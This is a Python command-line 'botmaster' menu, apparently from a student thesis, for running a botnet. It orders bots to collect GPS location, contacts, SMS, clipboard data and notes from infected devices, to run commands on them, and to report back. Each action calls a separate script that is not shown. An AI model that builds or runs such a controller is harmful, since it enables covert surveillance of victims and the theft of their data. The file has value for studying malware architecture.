# Botmaster para el TFG de Nicolas Cea Porras
# Es necesaria la dependencia firebase admin, instalar con pip3 install firebase-admin
# Es necesaria la dependencia Rich, instalar con pip install Rich
# Pensado para ser utilizado en kali linux pero puede utilizarse solo con python3

import os

################################################ MENU ############################################################
def menu():
    while True:
        mensajeMenu = """Please select an action:\n 
        (1) Send an order to the Botnet
        (2) Get information from the botnet
        (3) See alive bots
        (4) Remove a permanent order
        (5) Exit
        """
        errorSeleccion = "Please use an available integer from the list above\n"
        print(mensajeMenu)

        seleccionMenu = 0
        while True:
            try:
                seleccionMenu = int(input("Option: "))
                if(not(seleccionMenu>=1 and seleccionMenu<=5)):
                    raise Exception
            except:
                print(errorSeleccion)
                continue
            else:
                break
            
        if seleccionMenu == 1:
            seleccionPrimitivas()
            
        if seleccionMenu == 2:
            recuperaData()
            
        if seleccionMenu == 3:
            os.system("python3 botsVivos.py")
            print("")
        
        if seleccionMenu == 4:
            os.system("python3 eliminaPerma.py")
            
        if seleccionMenu == 5:
            salir()

################################################ RECUPERA DATA ############################################################
def recuperaData():
    print("Please select the information you would like to recover from the botnet:\n")
    while True:
        mensajePrimitivas = """
        (1) recover data from gps
        (2) recover data from device contacts
        (3) recover data from device SMS service
        (4) recover device specs
        (5) recover clipboard data
        (6) recover command output
        (7) recover in-app user notes
        (8) go back to menu
        (9) exit
        """

        errorSeleccion = "Please use an available integer from the list above\n"
        print(mensajePrimitivas)

        seleccionMenu = 0
        while True:
            try:
                seleccionMenu = int(input("Option: "))
                if(not(seleccionMenu>=1 and seleccionMenu<=9)):
                    raise Exception
            except:
                print(errorSeleccion)
                continue
            else:
                break
            
        if seleccionMenu == 1:
            os.system("python3 getGps.py")
        if seleccionMenu == 2:
            os.system("python3 getContacto.py")
        if seleccionMenu == 3:
            os.system("python3 getSms.py")
        if seleccionMenu == 4:
            os.system("python3 getDatosdispositivo.py")
        if seleccionMenu == 5:
            os.system("python3 getClipboard.py")
        if seleccionMenu == 6:
            os.system("python3 getCommand.py")
        if seleccionMenu == 7:
            os.system("python3 getNotes.py")
        if seleccionMenu == 8:
            menu()
        if seleccionMenu == 9:
            salir()

        print("Please select more information to get from the botnet")

################################################ SALIR ############################################################

def salir():
    mensaje = """    
    ######################
    #                    #
    #       Bye <3       #
    #                    #
    ######################
    """
    print(mensaje)
    quit()

################################################ SELECCION PRIMITIVAS ############################################################


def seleccionPrimitivas():
    print("Please select an order for the botnet:\n")
    while True:
        mensajePrimitivas = """
        (1) take gps data
        (2) take contact list
        (3) take sms list
        (4) take device data
        (5) execute a command on host
        (6) shut down bot (permanent until app is rebooted)
        (7) go back to menu
        (8) exit
        """

        errorSeleccion = "Please use an available integer from the list above\n"
        print(mensajePrimitivas)

        seleccionMenu = 0
        while True:
            try:
                seleccionMenu = int(input("Option: "))
                if(not(seleccionMenu>=1 and seleccionMenu<=8)):
                    raise Exception
            except:
                print(errorSeleccion)
                continue
            else:
                break
            
        if seleccionMenu == 1:
            os.system("python3 gps.py")
        if seleccionMenu == 2:
            os.system("python3 contacto.py")
        if seleccionMenu == 3:
            os.system("python3 sms.py")
        if seleccionMenu == 4:
            os.system("python3 datosdispositivo.py")
        if seleccionMenu == 5:
            os.system("python3 ping.py")
        if seleccionMenu == 6:
            os.system("python3 apaga.py")
        if seleccionMenu == 7:
            menu()
        if seleccionMenu == 8:
            salir()

        print("\nPlease select another order for the botnet")

################################################ MAIN ############################################################

def main():
    mensajeBienvenida = """    ################################################
    #                                              #
    # Bot Master server for Nicolas Cea Porras TFG #
    #                                              #
    ################################################"""

    print(mensajeBienvenida+"\n")
    menu()
    

if __name__ == "__main__":
    main()